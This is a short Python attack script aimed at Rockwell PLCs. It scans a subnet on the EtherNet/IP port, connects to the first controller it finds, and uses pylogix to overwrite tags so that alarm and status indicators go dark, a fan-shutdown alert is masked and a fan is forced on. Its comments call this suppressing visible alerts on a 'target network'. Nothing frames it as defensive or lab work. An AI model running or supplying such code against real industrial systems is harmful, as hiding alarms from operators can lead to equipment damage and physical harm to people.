from pylogix import PLC
import socket

def find_plc_ip(subnet="192.168.1"):
    """
    Scan for active Rockwell PLCs by checking common subnet range.
    Modify the subnet according to the target network.
    """
    for i in range(1, 255):  # Iterate through subnet range
        ip = f"{subnet}.{i}"
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)  # Timeout for fast scanning
        if s.connect_ex((ip, 44818)) == 0:
            s.close()
            return ip  # Return first detected PLC IP
        s.close()
    return None

def suppress_alarms(plc_ip):
    """
    Connects to the PLC and alters critical variables to suppress alarms.
    This prevents visible alerts while keeping the system operational.
    """
    comm = PLC()
    comm.IPAddress = plc_ip

    print(f"[+] Connected to PLC at {plc_ip}")

    # Modify alarm-related tags
    tags_to_override = {
        "_IO_EM_DO_06": False,  # Suppress Red LED (alarm indicator)
        "_IO_EM_DO_07": False,  # Suppress Green LED (status indicator)
        "FanA_Off": False,      # Prevent fan shutdown alert
        "Activate_FanA": True   # Force fan activation
    }

    for tag, value in tags_to_override.items():
        comm.Write(tag, value)
        print(f"[+] Modified {tag} -> {value}")

    comm.Close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        suppress_alarms(plc_ip)
    else:
        print("[-] No Rockwell PLC detected on the network.")